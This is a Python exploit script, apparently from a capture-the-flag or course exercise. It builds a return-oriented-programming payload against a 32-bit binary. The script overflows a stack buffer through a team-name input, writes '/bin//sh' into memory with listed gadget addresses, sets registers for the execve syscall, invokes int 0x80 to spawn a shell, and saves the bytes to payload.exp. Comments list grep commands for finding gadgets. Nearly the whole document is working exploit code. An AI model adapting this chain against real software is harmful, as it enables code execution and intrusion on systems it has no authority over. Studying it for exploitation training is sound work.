def sanitize_input(exploit_str):
	exploit_str_b = bytes.fromhex(exploit_str)
	exploit_str_split = [exploit_str_b[i:i + 1] for i in range(0, len(exploit_str_b), 1)]
	exploit_str_split.reverse()
	sanitize_exploit_str = b"\n".join(exploit_str_split) + b"\n"
	return sanitize_exploit_str




####################### STEP 0 : Corrupt loop iterator and overflow till frame pointer in stack #######################
corrupt_loop_iterator=b"S"*12+b"CC8"
set_team_name=b"a\ni\nG\na\nn\ne\ns\nh\na\n"+0xe*b"1\n" #+b"A\nB\nC\nD\n" #b"\x6c\n\xa0\n\x0e\n\x08\n"
step_0 = corrupt_loop_iterator + set_team_name




####################### STEP 1 : Load "/bin//////sh\0" string in memory #######################
# pop edx ; pop ebx ; ret
# 0x805edb9(0x080e5050)(0x080e5050)
step_1_1 = sanitize_input("0805edb9") + sanitize_input("080e5050") + sanitize_input("080e5050")
# pop eax ; ret
# 0x80b02ea('/bin')
step_1_2 = sanitize_input("080b02ea") + b"/\nb\ni\nn\n"
# mov dword ptr [edx], eax ; ret
# 0x0805faf2
step_1_3 = sanitize_input("0805faf2")

# pop edx ; pop ebx ; ret
# 0x805edb9(0x080e5054)(0x080e5050)
step_1_4 = sanitize_input("0805edb9") + sanitize_input("080e5054") + sanitize_input("080e5050")
# pop eax ; ret
# 0x80b02ea('////')
step_1_5 = sanitize_input("080b02ea") + b"/\n/\n/\n/\n"
# mov dword ptr [edx], eax ; ret
# 0x0805faf2
step_1_6 = sanitize_input("0805faf2")

# pop edx ; pop ebx ; ret
# 0x805edb9(0x080e5058)(0x080e5050)
step_1_7 = sanitize_input("0805edb9") + sanitize_input("080e5058") + sanitize_input("080e5050")
# pop eax ; ret
# 0x80b02ea('//sh')
step_1_8 = sanitize_input("080b02ea") + b"/\n/\ns\nh\n"
# mov dword ptr [edx], eax ; ret
# 0x0805faf2
step_1_9 = sanitize_input("0805faf2")

# pop edx ; pop ebx ; ret
# 0x805edb9(0x080e505c)(0x080e5050)
step_1_10 = sanitize_input("0805edb9") + sanitize_input("080e505c") + sanitize_input("080e5050")
# xor eax, eax ; ret
# 0x0804fe30
step_1_11 = sanitize_input("0804fe30")
# mov dword ptr [edx], eax ; ret
# 0x0805faf2
step_1_12 = sanitize_input("0805faf2")

step_1 = step_1_1 + step_1_2 + step_1_3 + step_1_4 + step_1_5 + step_1_6 + step_1_7 + step_1_8 + step_1_9 + step_1_10 + step_1_11 + step_1_12 




####################### STEP 2 : Load array [&("/bin//sh"), 0] #######################
# pop edx ; pop ebx ; ret
# 0x805edb9(0x080e5060)(0x080e5050)
step_2_1 = sanitize_input("0805edb9") + sanitize_input("080e5060") + sanitize_input("080e5050")
# pop eax ; ret
# 0x80b02ea(080e5050)
step_2_2 = sanitize_input("080b02ea") + sanitize_input("080e5050")
# mov dword ptr [edx], eax ; ret
# 0x0805faf2
step_2_3 = sanitize_input("0805faf2")

# pop edx ; pop ebx ; ret
# 0x805edb9(080e5064)(0x080e5050)
step_2_4 = sanitize_input("0805edb9") + sanitize_input("080e5064") + sanitize_input("080e5050")
# xor eax, eax ; ret
# 0x0804fe30
step_2_5 = sanitize_input("0804fe30")
# mov dword ptr [edx], eax ; ret
# 0x0805faf2
step_2_6 = sanitize_input("0805faf2")

step_2 = step_2_1 + step_2_2 + step_2_3 + step_2_4 + step_2_5 + step_2_6




####################### STEP 3 : Setting registers: eax, ebx, ecx, edx #######################
# xor edx, edx ; pop ebx ; mov eax, edx ; pop esi ; pop edi ; pop ebp ; ret
# 0x08050ab9(0x080e5050)(dummy)(dummy)(dummy)
# dummy_val = sanitize_input("080e5050")
# step_3_1 = sanitize_input("08050ab9") + b"".join([dummy_val]*4)

# mov edx, 0xffffffff ; ret
# 0x0805ef59
# inc edx ; ret
# 0x08066354 
step_3_1 = sanitize_input("0805ef59") + sanitize_input("08066354")

# pop ecx ; add al, 0xf6 ; ret
# 0x08064281(0x080e5060)
step_3_2 = sanitize_input("08064281") + sanitize_input("080e5060")

# pop ebx ; ret
# 0x8049022(0x080e5050) 
step_3_3 = sanitize_input("08049022") + sanitize_input("080e5050")

# xor eax, eax ; ret
# 0x0804fe30
zero_eax = sanitize_input("0804fe30")
# 0x0808883e
# inc eax ; ret
inc_eax = sanitize_input("0808883e")
syscall_num = 11
step_3_4 = zero_eax + b"".join([inc_eax]*syscall_num)

step_3 = step_3_1 + step_3_2 + step_3_3 + step_3_4




####################### STEP 4 : Invoking System Call #######################
# 0x0804a492
# int 0x80
step_4 = sanitize_input("0804a492")




####################### STEP 5 : Exiting loop #######################
step_5 = b"1"*12+b"\x09\x00\x00\x00\x00\n1\n"




# Final payload
payload = step_0 + step_1 + step_2  + step_3 + step_4 + step_5
exp_file_name = "payload.exp"
exp_out = open(exp_file_name,'wb')
exp_out.write(payload)
exp_out.close()

# grep -P ": mov dword ptr" list_gadgets.txt | grep -e "ret"
# grep -P ": pop edx" list_gadgets.txt | grep -e "ret"
# grep -P ": pop eax" list_gadgets.txt | grep -e "ret"


# grep -P ": xor eax, eax" list_gadgets.txt | grep -e "ret"
# grep -P ": pop ecx" list_gadgets.txt | grep -e "ret"
# grep -P ": xor edx, edx" list_gadgets.txt | grep -e "ret"
# grep -P ": mov edx" list_gadgets.txt | grep -e "ret"
